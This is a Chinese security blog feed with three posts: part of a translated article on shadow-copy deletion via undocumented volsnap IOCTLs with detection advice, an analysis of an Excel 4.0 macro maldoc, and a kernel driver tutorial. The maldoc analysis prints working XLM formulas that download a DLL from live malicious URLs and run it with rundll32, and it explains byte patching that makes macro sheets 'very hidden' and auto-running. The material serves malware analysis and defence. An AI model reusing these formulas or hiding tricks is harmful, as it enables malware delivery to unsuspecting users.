class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HRESULT <span class="title">DeleteSnapshots</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    VSS_ID SourceObjectId,</span></span></span><br><span class="line"><span class="params"><span class="function">    VSS_OBJECT_TYPE eSourceObjectType,</span></span></span><br><span class="line"><span class="params"><span class="function">    BOOL bForceDelete,</span></span></span><br><span class="line"><span class="params"><span class="function">    LONG* plDeletedSnapshots,</span></span></span><br><span class="line"><span class="params"><span class="function">    VSS_ID* pNondeletedSnapshotID</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span></span><br></pre></td></tr></table></figure><p>SourceObjectId 是卷影副本本身的 GUID 标识符，并且 eSourceObjectType 设置为 VSS_OBJECT_SNAPSHOT。</p><p>还记录了 VSS 对象，这些对象提供了管理快照的所有必需功能。 其中之一是 IVssSoftwareSnapshotProvider 接口，该接口还可用于调用所需的删除操作。 可以使用 IVssDifferentialSoftwareSnapshotMgmt 接口来更改差异区域的大小。</p><h3 id="直接设备访问"><a href="#直接设备访问" class="headerlink" title="直接设备访问"></a>直接设备访问</h3><p>删除快照时，执行流将到达将 IOCTL 发送到 volsnap.sys 的提供程序（swprv.dll）。 内核驱动程序不对设备打开请求或发送给它的 IOCTL 进行任何访问检查，以验证源是提供程序服务进程，因此可以从任何进程发送那些 IOCTL，甚至处理 COM 层。</p><p>使用 ProcMon，我们可以轻松跟踪提供者执行的操作：</p><ul><li>打开卷影副本卷的句柄（例如 \Device\HarddiskVolumeShadowCopy1）。</li><li>发送未记录的 IOCTL_VOLSNAP_SET_APPLICATION_INFO。</li><li>如果尚未将卷设置为使用 IOCTL_VOLUME_SET_GPT_ATTRIBUTES 隐藏。</li><li>接下来，通过发送 FSCTL_DISMOUNT_VOLUME和IOCTL_VOLUME_OFFLINE 禁用该卷。</li><li>打开后备卷的句柄（即 C :，卷影副本属性中的“原始卷”）。</li><li>发送未记录的 IOCTL_VOLSNAP_DELETE_SNAPSHOT（0x53C038），同时在输入缓冲区中传递要删除的快照名称。</li></ul><p>可以使用我们前面介绍的工具（vssadmin，WMI 和 COM 对象）来查询卷影副本属性。 步骤 1-4 是可选的，但请记住，它们可确保过程的有效性，跳过它们可能会导致失败或意外结果。</p><p>可以使用我们前面介绍的工具（vssadmin，WMI 和 COM 对象）来查询卷影副本属性。 步骤 1-4 是可选的，但请记住，它们可确保过程的有效性，跳过它们可能会导致失败或意外结果。</p><p><img src="https://image.zeronohacker.com/article/2020/04/29/A95865EDE81A27AF9D6C3B34B72DF5D0.png" alt=""></p><p>为了调整差异区域的大小，提供程序将未记录的 IOCTL_VOLSNAP_SET_MAX_DIFF_AREA_SIZE（0x53C028）发送到原始卷，如下图所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/29/0A1236A05C37A9087587BA239E388DE1.png" alt=""></p><p>即使驱动程序会验证请求的来源是提供者的服务，但向其中注入代码以执行上述操作也将绕过该检查。</p><h2 id="如何检测"><a href="#如何检测" class="headerlink" title="如何检测"></a>如何检测</h2><p>我们描述的方法在不同的层上运行，每种方法都提供了多种检测机制的选择。</p><p>首先要开始的是命令行参数扫描，这是一个非常基本的解决方案。虽然它涵盖了勒索软件当今使用的大多数技术4fewd[，但防御者必须考虑各种语法风格，并能够处理新的混淆形式和发现新的 LOLBins。此外，存在隐藏命令行参数的已知技术。</p><p>对于更广泛的方法，需要某种形式的 COM 监视。</p><p>一个直观的解决方案可以是搜索意外进程中加载的库的任何异常。例如，如果 vss_ps.dll 由 vssadmin.exe 或 wmiprvse.exe 以外的其他进程加载（使用 WMI 时），则可以将其视为可疑文件。但是，这可能会产生假阳性，因为它不能确保我们实际上正在使用 vss_ps.dll，并且卷影副本正在被删除。监视实际的 COM 对象将授予更准确的结果。可以监视对注册表中相关键的访问，但是对于假阳性也有相同的问题。相反，使用 COM 对象代理和筛选器可能被证明是适当的解决方案。</p><p>最终的解决方案是监视执行流程中的最后一步，因为它是所有方法中的通用交点-设备 IO 控件调用驱动程序。这些应该源自提供者服务。可以在每个进4fewd[程的 DeviceIoControl 和 ZwDeviceIoControlFile 之类的函数上安装挂钩，以监视这些调用，但是可以避免攻击者逃避它们的麻烦。消耗 ETW 事件来检测那些 IOCTL 代码是一种更可行的可能性。最后一个选择是使用内核驱动程序并执行 IRP 筛选，它还支持阻止任何潜在的恶意请求的功能。</p><h2 id="如何解决"><a href="#如何解决" class="headerlink" title="如何解决"></a>如何解决</h2><p>FortiEDR 平台能够检测本文档中概述的现有技术和新技术。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>在本文中，我们介绍了各种擦除卷影副本的方法，从已知的命令行实用程序到各种程序形式。</p><p>几乎所有这些方法都以一种或另一种方式操作 COM 对象，即使没有正式记录的方法也是如此。我们展示了一种替代方法，该方法不依赖那些对象，而是在直接访问卷影复制设备时模仿它们的操作。</p><p>我们提出了不同的想法来检测和防止所描述方法的任何恶意使用，因为仅依靠命令行参数进行检测被证明是徒劳的。首选方法是监视对卷影拷贝设备本身的访问。</p><p>总而言之，这项研究强调了前提，即防御者必须保持警惕，以领先于坏人，并不断采用新的检测方法和功能。而且，为了保持领先地位，进行进攻性研究对防御者而言与对攻击者一样重要。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;本文翻译自：&lt;a href=&quot;https://www.fortinet.com/blog/threat-research/stomping-shadow-copies-a-second-look-into-deletion-methods.html</summary>
      
    
    
    
    <category term="安全技术" scheme="https://zeronohacker.github.io/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/"/>
    
    
    <category term="VSS" scheme="https://zeronohacker.github.io/tags/VSS/"/>
    
    <category term="Ransomeware" scheme="https://zeronohacker.github.io/tags/Ransomeware/"/>
    
  </entry>
  
  <entry>
    <title>从一个野外 office 样本分析中学习 Excel 4.0 marco</title>
    <link href="https://zeronohacker.github.io/2020/04/18/learn-excel-4-marco-from-an-analysis-of-a-field-office-sample/"/>
    <id>https://zeronohacker.github.io/2020/04/18/learn-excel-4-marco-from-an-analysis-of-a-field-office-sample/</id>
    <published>2020-04-18T09:23:08.000Z</published>
    <updated>2021-09-19T09:35:40.107Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前述"><a href="#前述" class="headerlink" title="前述"></a>前述</h2><p>今日在野外获得一个特别有意思的 office 样本（Excel 文档），这个样本运用了 Excel 4.0 marco 技术，并且还隐藏了。由于自己对 Excel 4.0 marco 技术不是太深入了解，所以打算趁此在周末好好学习下 Excel 4.0 marco。在开始之前，我们先聊下 Excel 4.0 marco。</p><p>Excel 4.0 marco，也可叫做 XLM（这里的 XLM 不是 XML） marco，这项技术早在 1992 年就引入了，可以说是一种非常古老的技术。我们知道，现如今，几乎所有针对 MS Office 的恶意宏文档都基于 Visual Basic for Application（VBA）。另外，XLM 宏对于红队来说是一个杀手锏，并且是出于进攻目的，它是 VBA 宏非常好的替代品，XLM 可能难以解析，而且似乎大多数反病毒软件无法检测 XLM 恶意文档。虽然到目前为止该技术已经使用了 28 年，但最近几年出的 MS Office 版本仍支持 Excel 4.0 marco，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/2131fc02d8a56dc4fc57023e1515bbf6.png" alt=""></p><p>在 1992 年，针对 windows 3.0 和 3.1 发布电子表格软件 Excel 4.0 时，为了实现自动化，可以通过所谓的宏工作表在此版本中的 Excel 中使用 XLM 宏。XLM 与 VBA 不一样，后者在一年后的 Excel 5.0 中引入。</p><h2 id="创建-XLM-宏"><a href="#创建-XLM-宏" class="headerlink" title="创建 XLM 宏"></a>创建 XLM 宏</h2><p>创建一个新的 Excel 文件，名为 xlm_macro.xlsx，新创建的默认会有三张工作表，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/15253974f73040ca3d9c022919acf1f6.png" alt=""></p><p>在 Sheet1 工作表中右键点击插入，会弹出你需要创建的对象，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/55a369349312bb8a112bb4d8ca9c3feb.png" alt=""></p><p>在弹出的界面中选择 MS Excel 4.0 宏表，最后点击确定，这样就创建了一张 XLM 宏工作表了，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/ebdb6c7b353d04b513620ef9e0f982e6.png" alt=""></p><p>在这张工作表当中选择一个单元格并输入 <code>=EXEC(&quot;calc.exe&quot;)</code>、<code>=ALERT(&quot;XLM macro&quot;)</code> 和 <code>=HALT()</code>，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/a4fb543311b9a06c34b1d59180ad9361.png" alt=""></p><p>选中 A1 单元格，右击选择执行，在弹出的对话框中点击执行，执行后结果如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/c7abeadd75668db46404250270c6878.png" alt=""></p><p>如果您希望宏在打开工作簿时自动运行（类似于 VBA 宏的 Sub AutoOpen()），请将宏的第一个单元重命名为 Auto_open，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/b122f365fe9740d21e3356876e5c9700.png" alt=""></p><p>最后保存，由于这里启用了宏的功能，所以保存的格式为 xls，保存好后，用 olevba.py 工具检测下，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/7f95cebf0d117f3a142fb7b4ca0cbdcd.png" alt=""></p><p>由上图可知，存在利用 Excel 4.0 macro，并且是 visible，但是我遇到的样本，却是 very hidden，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/f28535a1f73293cf9c7942cb82142e58.png" alt=""></p><p>在 Excel 用户界面上是没有显示出来的，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/8956e1a900537bc0fb87d57996aec1b2.png" alt=""></p><p>在工作表中右击选择取消隐藏，发现取消隐藏命令变灰了，那这种的是如何实现的呢？要想把这个搞清楚，我们先来谈一下普通工作表（区别于 Excel 4.0 宏表）的隐藏。</p><h2 id="普通工作表的普通隐藏和深度隐藏"><a href="#普通工作表的普通隐藏和深度隐藏" class="headerlink" title="普通工作表的普通隐藏和深度隐藏"></a>普通工作表的普通隐藏和深度隐藏</h2><p>普通工作表的普通隐藏和显示，大家可以观看这个短视频了解：<a href="https://youtu.be/hJsF8dK745Y">https://youtu.be/hJsF8dK745Y</a></p><p>普通工作表的深度隐藏和显示，下面这段短视频做了演示：<a href="https://youtu.be/T70nF5_OPn4">https://youtu.be/T70nF5_OPn4</a></p><h2 id="Excel-4-0-宏表的隐藏和显示"><a href="#Excel-4-0-宏表的隐藏和显示" class="headerlink" title="Excel 4.0 宏表的隐藏和显示"></a>Excel 4.0 宏表的隐藏和显示</h2><p>和普通工作表一样，Excel 4.0 宏表也有普通隐藏和深度隐藏，它的普通隐藏操作和普通工作表一样，也是在右击工作表选择隐藏命令，同时也能选择取消隐藏命令，但是这种并不是真正的隐藏，真正的隐藏为深度隐藏，如要实现，需要用十六进制编辑器修改它的字节码，这种深度隐藏的好处就是在 Excel 用户界面上显示不出，并且不能通过取消隐藏命令来使其显示，如要显示，需要修改对应字节码，这样就出现一个问题，在哪个地方修改呢？这是一个比较关键的地方，我们知道，Excel 4.0 宏功能存储在工作簿流中的 BIFF 记录中，如果你需要快速定位，可借助 oledump 工具里的一个插件来完成，这个插件为 plugin_biff.py，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/47f673b9b50bf1dfc148d7034501948e.png" alt=""></p><p>如上图所示，若需深度隐藏，只需要将第 5 个字节改为 0x02 就行。将 xls 文件拖入到 010 Editor 中，然后搜索 <code>C4 2E 00 00 00 01 06 ……</code> 序列，改动第 5 个字节，最后保存，保存后双击运行验证是否成功，同理，如要显示，也是重复上述操作，只不过值改为 0x00 就行，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/c274b3577d69c75e477c008a314d7611.png" alt=""></p><div class="tip "><p>但是需要注意一点，这个需要定位的字节序列不是固定的，但是要修改的偏移是固定的。</p></div><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><p>样本信息：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/cf9d6ab3d61848665c00a957d83e65d2.png" alt=""></p><p>由于此样本运用了 Excel 4.0 macro，并且还深度隐藏了，所以只需用上一小节提到的方法对该样本修改关键字节码就可以，修改后如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/1259b243751caff1a85f3f2b6695c7a0.png" alt=""></p><p>Excel 4.0 宏表中出现了大量的 =CHAR，在右边也有相关命令，拉至最上端，选中单元格，右击选择运行，这里需要允许宏执行，但为了避免运行到 =WORKBOOK.HIDE 和 =GOTO，我暂时把这两行删除再运行，运行后的结果如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/dd3a549768de0e45f286ba219ee8c07a.png" alt=""></p><p>oh my god，what a fu** ？被我删除的那两句，它是把这个工作表隐藏，再跳转到 R2 单元格执行，而 R2 单元格名为 Auto_open，所以当你打开这个文档时，启用了宏就会自动从 R2 单元处开始执行命令。R6 单元格命令如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=<span class="keyword">CALL</span>(<span class="string">&quot;Shell32&quot;</span>,<span class="string">&quot;ShellExecuteA&quot;</span>,<span class="string">&quot;JJCCCJJ&quot;</span>,<span class="number">0</span>,<span class="string">&quot;open&quot;</span>,<span class="string">&quot;C:\Windows\system32\reg.exe&quot;</span>,<span class="string">&quot;EXPORT HKCU\Software\Microsoft\Office\&quot;</span>&amp;<span class="keyword">GET</span>.WORKSPACE(<span class="number">2</span>)&amp;<span class="string">&quot;\Excel\Security c:\users\public\1.reg /y&quot;</span>,<span class="number">0</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>上述命令通过将本地 Office 的安全设置注册表项导出到 1.reg 文件中，配合后面打开读取安全设置，判断 R11 中读取的内容是否有 0001，并接着判断返回的是否为数字。R16 单元格命令，远程下载文件并保存在本地，文件名为 bqg85ef.html：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=<span class="keyword">CALL</span>(<span class="string">&quot;urlmon&quot;</span>,<span class="string">&quot;URLDownloadToFileA&quot;</span>,<span class="string">&quot;JJCCJJ&quot;</span>,<span class="number">0</span>,<span class="string">&quot;http://kacper-formela.pl/wp-smart.php&quot;</span>,<span class="string">&quot;c:\Users\Public\bqg85ef.html&quot;</span>,<span class="number">0</span>,<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>R17 单元格命令，当 R16 执行失败时，换个域名连接继续下载文件并保存在本地，文件名为 bqg85ef.html：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=<span class="keyword">IF</span>(R16&amp;lt;<span class="number">0</span>,<span class="keyword">CALL</span>(<span class="string">&quot;urlmon&quot;</span>,<span class="string">&quot;URLDownloadToFileA&quot;</span>,<span class="string">&quot;JJCCJJ&quot;</span>,<span class="number">0</span>,<span class="string">&quot;http://braeswoodfarmersmarket.com/wp-smart.php&quot;</span>,<span class="string">&quot;c:\Users\Public\bqg85ef.html&quot;</span>,<span class="number">0</span>,<span class="number">0</span>),)</span><br></pre></td></tr></table></figure><p>R20 单元格命令，由这条命令可知上述通过远程下载的 bqg85ef.html 其实不是一个 html 文件，而是一个 dll：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">=<span class="keyword">CALL</span>(<span class="string">&quot;Shell32&quot;</span>,<span class="string">&quot;ShellExecuteA&quot;</span>,<span class="string">&quot;JJCCCJJ&quot;</span>,<span class="number">0</span>,<span class="string">&quot;open&quot;</span>,<span class="string">&quot;C:\Windows\system32\rundll32.exe&quot;</span>,<span class="string">&quot;c:\Users\Public\bqg85ef.html,DllRegisterServer&quot;</span>,<span class="number">0</span>,<span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>URL：</p><ul><li>http[:]//kacper-formela[.]pl/wp-smart[.]php；</li><li>http[:]//braeswoodfarmersmarket[.]com/wp-smart[.]php；</li></ul><p>虽然上面现已无法访问，但是通过 VT 上关联分析还是拿到了相关的样本，顺便把 1.reg 也拿到了，不过这个拿不拿没关系，主要是后面这个关键 dll。让我们来看下 1.reg 中的内容吧，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/d4e12abe2c6fc52cbd77c0951d5aceb4.png" alt=""></p><p>我们再来看下那个 dll，首先通过 strings 工具查看字符串，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/ad168c4a5358c0e6a8f618b544530e3f.png" alt=""></p><p>在 dll 文件中发现 pdb 路径，通过 pdb 路径名可知是个 POC，就只为弹个计算器，如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/af2b1e88f68e98b198ed7627f9f18b4e.png" alt=""></p><p>在 Github 居然找到了该 dll，what？如下所示：</p><p><img src="https://image.zeronohacker.com/article/2020/04/18/228bd77f6b72c83299b0f679d708cd70.png" alt=""></p><p><img src="https://image.zeronohacker.com/article/2020/04/18/79e65b91eb4ff81c37293556f4de64bb.png" alt=""></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然最终啥也没，但是也学到不少东西，比如 Excel 4.0 macro 的深度隐藏，发现宏还可以这样玩，就这样吧，洗洗睡，困了~</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/">https://outflank.nl/blog/2018/10/06/old-school-evil-excel-4-0-macros-xlm/</a></li><li><a href="https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/analysis-suspicious-very-hidden-formula-on-excel-4-0-macro-sheet">https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/analysis-suspicious-very-hidden-formula-on-excel-4-0-macro-sheet</a></li><li><a href="https://isc.sans.edu/forums/diary/Excel+Maldocs+Hidden+Sheets/25876/">https://isc.sans.edu/forums/diary/Excel+Maldocs+Hidden+Sheets/25876/</a></li><li><a href="https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/more-excel-4-0-macro-malspam-campaigns/">https://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/more-excel-4-0-macro-malspam-campaigns/</a></li></ul><h2 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h2><p>MD5：</p><ul><li>3c2a1ce4a43a0ee2546f195f2e6de8cb</li><li>532a449af9d242579f9ec3dfa34e44e4</li><li>d28a070dec7a29ad35e8baf1c56b5cdc</li></ul><p>URL：</p><ul><li>http[:]//kacper-formela[.]pl/wp-smart[.]php；</li><li>http[:]//braeswoodfarmersmarket[.]com/wp-smart[.]php；</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前述&quot;&gt;&lt;a href=&quot;#前述&quot; class=&quot;headerlink&quot; title=&quot;前述&quot;&gt;&lt;/a&gt;前述&lt;/h2&gt;&lt;p&gt;今日在野外获得一个特别有意思的 office 样本（Excel 文档），这个样本运用了 Excel 4.0 marco 技术，并且还隐藏了。</summary>
      
    
    
    
    <category term="样本分析" scheme="https://zeronohacker.github.io/categories/%E6%A0%B7%E6%9C%AC%E5%88%86%E6%9E%90/"/>
    
    
    <category term="Excel 4.0 Macro" scheme="https://zeronohacker.github.io/tags/Excel-4-0-Macro/"/>
    
    <category term="XLM" scheme="https://zeronohacker.github.io/tags/XLM/"/>
    
  </entry>
  
  <entry>
    <title>内核编程 —— 入口函数详解</title>
    <link href="https://zeronohacker.github.io/2020/04/05/kernel-programming-detailed-explanation-of-entry-function/"/>
    <id>https://zeronohacker.github.io/2020/04/05/kernel-programming-detailed-explanation-of-entry-function/</id>
    <published>2020-04-05T09:12:58.000Z</published>
    <updated>2021-09-19T09:21:06.012Z</updated>
    
    <content type="html"><![CDATA[<h2 id="内核入口函数"><a href="#内核入口函数" class="headerlink" title="内核入口函数"></a>内核入口函数</h2><p>具有 windows 应用层（用户态）开发经验的朋友应该很清楚，windows 应用程序有统一的 WinMain 入口函数，类似于应用层，内核驱动也有一个统一的入口函数，名字叫做 DriverEntry，DriverEntry 函数的原型如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTAUS <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT pDriverObject,PUNICODE_STRING pRegistryPath )</span></span></span><br></pre></td></tr></table></figure><p>第一个参数为 pDriverObject，表示一个驱动对象指针，一个驱动文件（.sys）运行之后，操作系统在内存中为该驱动分配一个类型为 DRIVER_OBJECT 的数据结构，用于记录该驱动的详细信息，结构定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    CSHORT Type;</span><br><span class="line">    CSHORT Size;</span><br><span class="line">    <span class="comment">// The following links all of the devices created by a single driver</span></span><br><span class="line">    <span class="comment">// together on a list, and the Flags word provides an extensible flag</span></span><br><span class="line">    <span class="comment">// location for driver objects.</span></span><br><span class="line">    </span><br><span class="line">    PDEVICE_OBJECT DeviceObject; <span class="comment">// 设备链 </span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// The following section describes where the driver is loaded. The count</span></span><br><span class="line">    <span class="comment">// field is used to count the number of times the driver has had its</span></span><br><span class="line">    <span class="comment">// registered reinitialization routine invoked.</span></span><br><span class="line">   </span><br><span class="line">    PVOID DriverStart;</span><br><span class="line">    ULONG DriverSize;</span><br><span class="line">    PVOID DriverSection;</span><br><span class="line">    PDRIVER_EXTENSION DriverExtension; <span class="comment">// 驱动扩展，对于 WDM 程序比较重要 </span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">// The driver name field is used by the error log thread</span></span><br><span class="line">    <span class="comment">// determine the name of the driver that an I/O request is/was bound.</span></span><br><span class="line">    </span><br><span class="line">    UNICODE_STRING DriverName; <span class="comment">// 驱动名称 </span></span><br><span class="line">    <span class="comment">// The following section is for registry support. This is a pointer</span></span><br><span class="line">    <span class="comment">// to the path to the hardware information in the registry</span></span><br><span class="line">    </span><br><span class="line">    PUNICODE_STRING HardwareDatabase; <span class="comment">// 设备的硬件数据库名称 </span></span><br><span class="line">   </span><br><span class="line">    <span class="comment">// The following section contains the optional pointer to an array of</span></span><br><span class="line">    <span class="comment">// alternate entry points to a driver for &quot;fast I/O&quot; support. Fast I/O</span></span><br><span class="line">    <span class="comment">// is performed by invoking the driver routine directly with separate</span></span><br><span class="line">    <span class="comment">// parameters, rather than using the standard IRP call mechanism. Note</span></span><br><span class="line">    <span class="comment">// that these functions may only be used for synchronous I/O, and when</span></span><br><span class="line">    <span class="comment">// the file is cached.</span></span><br><span class="line">    </span><br><span class="line">    PFAST_IO_DISPATCH FastIoDispatch; <span class="comment">// 文件驱动程序中的快速 IO 请求函数地址 </span></span><br><span class="line">    <span class="comment">// The following section describes the entry points to this particular</span></span><br><span class="line">    <span class="comment">// driver. Note that the major function dispatch table must be the last</span></span><br><span class="line">    <span class="comment">// field in the object so that it remains extensible.</span></span><br><span class="line">    </span><br><span class="line">    PDRIVER_INITIALIZE DriverInit;</span><br><span class="line">    PDRIVER_STARTIO DriverStartIo; <span class="comment">// DriverStartIo 派发函数的地址 </span></span><br><span class="line">    PDRIVER_UNLOAD DriverUnload; <span class="comment">// 卸载函数指针 </span></span><br><span class="line">    PDRIVER_DISPATCH MajorFunction[IRP_MJ_MAXIMUM_FUNCTION + <span class="number">1</span>]; <span class="comment">// 30 个分发函数</span></span><br><span class="line"> &#125; DRIVER_OBJECT; </span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">DRIVER_OBJECT</span> *<span class="title">PDRIVER_OBJECT</span>;</span></span><br></pre></td></tr></table></figure><p>以上就是驱动对象结构体信息，在这只提比较重要字段，第一，DeviceObject（设备对象），每个驱动程序都会有一个或多个设备对象，所有设备对象以链表的形式串联起来，驱动对象中的设备对象字段指的是所有设备对象的第一个对象，通过它可以遍历所有设备对象；第二，DriverName（驱动名称），表示的该驱动的名称，采用 UNICODE 编码，该字符串的一般形式为 <strong>\Driver[驱动程序名称]</strong>；第三，DriverUnload（驱动卸载函数），指向该驱动程序的卸载函数地址；第四，MajorFunction（派遣函数指针数组），该数组的每个指针成员指向一个响应的处理 IRP 的派遣函数。第二个参数 pRegistryPath 是一个类型为 UNICODE_STRING 的指针，表示当前驱动所对应的注册表位置。UNICODE_STRING 是内核中表示字符串的结构体，对应定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Unicode strings are counted 16-bit character strings. If they are </span></span><br><span class="line"><span class="comment">// NULL terminated, Length does not include trailing NULL. </span></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> </span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    USHORT Length;</span><br><span class="line">    USHORT MaximumLength; </span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> MIDL_PASS[size_is(MaximumLength / 2), length_is((Length) / 2) ] USHORT * Buffer; </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span> <span class="comment">// MIDL_PASS_Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">// MIDL_PASS </span></span></span><br><span class="line">&#125; UNICODE_STRING; </span><br><span class="line"><span class="keyword">typedef</span> UNICODE_STRING *PUNICODE_STRING; </span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">const</span> UNICODE_STRING *PCUNICODE_STRING;</span><br></pre></td></tr></table></figure><p>其中 Buffer 为一个指针，指向一个 UNICODE 类型的字符串缓冲区；MaximumLength 表示 Buffer 所指向缓冲区的总空间大小，一般等于 Buffer 被分配时的内存大小，单位为字节；Length 表示 Buffer 所指向缓冲区中字符串的长度，单位也是字节。</p><div class="tip "><p>请注意，Buffer 指向的字符串，并不要求以 ‘\0’ 作为结束，在大多数情况下，Buffer 指向的字符串没有以 ‘\0’ 结尾。</p></div><p>那如何来验证上面这一事实呢？实践才是验证真理唯一途径。这里我以我写好的一个驱动程序（FirstDriver.sys）作为一个例子来调试，不多说，直接上 windbg，设置好环境后，在虚拟机里以管理员方式运行 cmd，输入如下命令（已禁用驱动强制签名，= 后面有一个空格）：</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/EA123FF51DB59FA5B51272FD80C31753.png" alt=""></p><p>以上就表示创建服务成功了，接下来便是启动服务，在启动服务之前，先对驱动入口函数下个断，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">kd&gt;</span><span class="bash"> bu FirstDriver!DriverEntry</span></span><br></pre></td></tr></table></figure><p>下断之后，输入 g 命令把控制权转给操作系统，下面就启动服务，把 DebugView 开着，如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start FirstDriver</span><br></pre></td></tr></table></figure><p>启动服务后，中断到 windbg，输入 p 命令单步运行起来，让 pRegistryPath 压入栈中，好了后，输入 kp 查看函数参数，如下：</p><p><img src="https://image.zeronohacker.com/article/2020/04/05/6949A1F604B46449984092C4A5DA5D25.png" alt=""></p><p>从上图可看出，地址位于 0x9336c00，接下来，查看结构体内容，输入如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">kd&gt;</span><span class="bash"> dt nt!_UNICODE_STRING 0x00000000`9336c000</span></span><br></pre></td></tr></table></figure><p><img src="https://image.zeronohacker.com/article/2020/04/05/D6DA8C567C7FE2CCB8994767C5A9EE35.png" alt=""></p><p>从上图可看出 Buffer 字符串长度为 59，又因为为宽字符类型，所以占用 118 